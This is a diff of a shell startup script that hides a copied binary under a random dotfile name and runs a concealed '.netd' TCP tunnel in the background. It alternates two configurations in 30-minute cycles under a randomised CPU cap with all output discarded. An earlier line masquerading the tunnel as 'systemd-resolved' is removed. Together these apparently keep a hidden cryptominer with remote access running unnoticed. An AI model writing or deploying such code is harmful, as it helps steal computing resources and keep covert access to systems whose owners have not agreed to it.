@@ -6,19 +6,43 @@ NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"
 
 cp /app/isu "/app/$NAME"
 chmod +x "/app/$NAME"
-
 rm -f /app/isu
 
-(exec -a systemd-resolved /usr/local/bin/.netd access tcp \
+/usr/local/bin/.netd access tcp \
 --hostname "$(cat .h)" \
---url 127.0.0.1:443 >/dev/null 2>&1 &)
+--url 127.0.0.1:443 >/dev/null 2>&1 &
 
 sleep 3
 
-# loop cfg <-> sfg masing-masing 30 menit
 while true; do
-  timeout 30m cpulimit -l 80 /app/$NAME -c .cfg >/dev/null 2>&1
-  timeout 30m cpulimit -l 75 /app/$NAME -c .sfg >/dev/null 2>&1
+
+  # ===== RUN CFG =====
+  /app/$NAME -c .cfg >/dev/null 2>&1 &
+  P=$!
+
+  LIMIT=$((70 + RANDOM % 10))
+  cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &
+
+  sleep 1800
+
+  kill -15 $P 2>/dev/null
+  sleep 2
+  kill -9 $P 2>/dev/null
+
+
+  # ===== RUN SFG =====
+  /app/$NAME -c .sfg >/dev/null 2>&1 &
+  P=$!
+
+  LIMIT=$((65 + RANDOM % 10))
+  cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &
+
+  sleep 1800
+
+  kill -15 $P 2>/dev/null
+  sleep 2
+  kill -9 $P 2>/dev/null
+
 done &
 
 tail -f /dev/null
